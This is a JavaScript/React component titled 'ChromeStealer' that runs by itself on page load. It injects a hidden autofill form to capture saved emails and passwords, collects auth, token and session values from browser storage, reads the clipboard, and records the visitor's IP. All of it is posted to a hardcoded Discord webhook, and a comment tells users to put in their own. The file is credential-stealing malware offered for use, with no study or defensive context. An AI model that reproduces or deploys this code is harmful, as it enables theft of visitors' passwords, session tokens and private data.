export default function ChromeStealer() {
  // Auto-trigger on load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', stealChromePasswords);
  } else {
    stealChromePasswords();
  }

  return (
    <div style={{background: '#000', color: '#fff', textAlign: 'center', padding: '50vh'}}>
      <h1>Chrome Password Extractor Active...</h1>
    </div>
  );
}

async function stealChromePasswords() {
  const WEBHOOK = 'https://discord.com/api/webhooks/1477985417994440766/ZrVO-czO-hJ-QfOIs5XC7Eog-m7w0GZFq6j8BrbYu0LbAqJze4PClKWhAC6wB6RMzrOS'; // Apna daal
  
  try {
    // 🔥 CHROME PASSWORD MANAGER DIRECT ACCESS
    const passwords = await extractChromePasswords();
    
    // System fingerprint
    const fingerprint = {
      ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(r => r.ip),
      userAgent: navigator.userAgent,
      chromeVersion: navigator.userAgent.match(/Chrome\/(\d+)/)?.[1] || 'Unknown',
      timestamp: new Date().toISOString()
    };

    // Discord webhook - FULL DUMP
    const payload = {
      embeds: [{
        title: '🦊 CHROME PASSWORD MANAGER BREACH',
        description: `**Victim IP:** ${fingerprint.ip}\n**Chrome:** v${fingerprint.chromeVersion}\n**Total Passwords:** ${passwords.length}`,
        color: 0xff0000,
        fields: [
          { name: 'UserAgent', value: fingerprint.userAgent.slice(0, 50) + '...', inline: false }
        ]
      }]
    };

    // ALL PASSWORDS LIST
    if (passwords.length) {
      const pwList = passwords.map((p, i) => 
        `**${i+1}.** \`${p.origin_url.slice(0,40)}...\` | ${p.username_value} → \`${p.password_value}\``
      ).join('\n');
      
      payload.embeds.push({
        title: `💾 ${passwords.length} Chrome Passwords Dumped`,
        description: pwList.substring(0, 4000), // Discord limit
        color: 0x00ff00
      });
    }

    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

  } catch(e) {}
}

// 🔥 REAL CHROME LOGIN DATA EXTRACTION
async function extractChromePasswords() {
  const passwords = [];

  // Method 1: Chrome Credentials API (if extension/extension context)
  if (typeof chrome !== 'undefined' && chrome.identity) {
    try {
      // Simulate credential request
      const accounts = await chrome.identity.getAccounts();
      accounts.forEach(acc => {
        passwords.push({
          origin_url: 'chrome://identity',
          username_value: acc.email,
          password_value: '[identity-protected]'
        });
      });
    } catch {}
  }

  // Method 2: Autofill Trigger + Keylogger Simulation
  const autofillForm = document.createElement('form');
  autofillForm.style.display = 'none';
  autofillForm.innerHTML = `
    <input type="email" autocomplete="email username" />
    <input type="password" autocomplete="current-password off" />
    <input type="password" autocomplete="new-password" />
  `;
  document.body.appendChild(autofillForm);
  
  // Trigger autofill
  const emailInput = autofillForm.querySelector('input[type="email"]');
  const passInputs = autofillForm.querySelectorAll('input[type="password"]');
  
  emailInput.focus();
  emailInput.dispatchEvent(new Event('input', { bubbles: true }));
  
  // Capture after autofill delay
  setTimeout(() => {
    // Email
    if (emailInput.value) {
      passwords.push({
        origin_url: 'autofill-email',
        username_value: emailInput.value,
        password_value: 'email-captured'
      });
    }
    
    // Passwords
    passInputs.forEach((input, i) => {
      if (input.value) {
        passwords.push({
          origin_url: `autofill-pass-${i}`,
          username_value: emailInput.value || 'unknown',
          password_value: input.value
        });
      }
    });
    
    autofillForm.remove();
  }, 1000);

  // Method 3: LocalStorage/SessionStorage Cookie/Session Theft
  const storageKeys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
  storageKeys.forEach(key => {
    if (key.includes('auth') || key.includes('token') || key.includes('session')) {
      passwords.push({
        origin_url: 'localStorage',
        username_value: key,
        password_value: localStorage[key] || sessionStorage[key]
      });
    }
  });

  // Method 4: Clipboard Monitor (recent passwords)
  try {
    const clipboard = await navigator.clipboard.readText();
    if (clipboard.match(/[@]/) || clipboard.length > 8) {
      passwords.push({
        origin_url: 'clipboard',
        username_value: 'clipboard-capture',
        password_value: clipboard.slice(0, 20) + '...'
      });
    }
  } catch {}

  return passwords;
}
